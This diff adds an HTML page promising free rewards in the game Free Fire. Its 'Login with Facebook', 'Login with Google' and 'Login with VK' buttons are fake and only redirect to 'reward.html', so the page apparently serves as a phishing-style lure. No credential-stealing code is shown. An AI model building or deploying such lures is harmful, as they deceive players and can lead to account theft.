@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Free Fire Reward - Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f0f0f;
+      color: white;
+      text-align: center;
+      padding: 40px 20px;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 12px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Login to Claim Free Fire Rewards</h1>
+    <button class="btn" onclick="goToReward()">Login with Facebook</button>
+    <button class="btn" onclick="goToReward()">Login with Google</button>
+    <button class="btn" onclick="goToReward()">Login with VK</button>
+  </div>
+
+  <script>
+    function goToReward() {
+      window.location.href = "reward.html";
+    }
+  </script>
+</body>
+</html>
